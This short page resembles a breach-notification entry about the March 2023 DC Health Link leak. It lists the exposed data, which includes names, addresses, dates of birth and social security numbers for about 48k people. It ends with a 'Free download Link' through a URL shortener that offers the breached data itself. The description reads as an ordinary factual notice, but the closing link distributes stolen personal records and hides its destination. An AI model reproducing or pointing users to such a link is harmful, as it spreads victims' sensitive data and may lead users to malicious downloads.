# DCHealth database leak

## Description

2023-03-06

In March 2023, <a href="https://cyberscoop.com/dc-health-link-breach-russia-hacker-congress/" target="_blank" rel="noopener">DC Health Link discovered a data breach</a> that was later publicly posted to a popular data breach forum. The impacted data included 48k unique email addresses alongside names, genders, dates of birth, home addresses, phone numbers and social security numbers. The data was provided to HIBP by a source who requested it be attributed to &quot;Aegis&quot; and &quot;IntelBroker&quot;.

## Breached data

Citizenship statuses, Dates of birth, Email addresses, Employers, Ethnicities, Genders, Names, Phone numbers, Physical addresses, Purchases, Social security numbers

## Free download Link

[DCHealth breach Free Download Link](https://tinyurl.com/2b2k277t)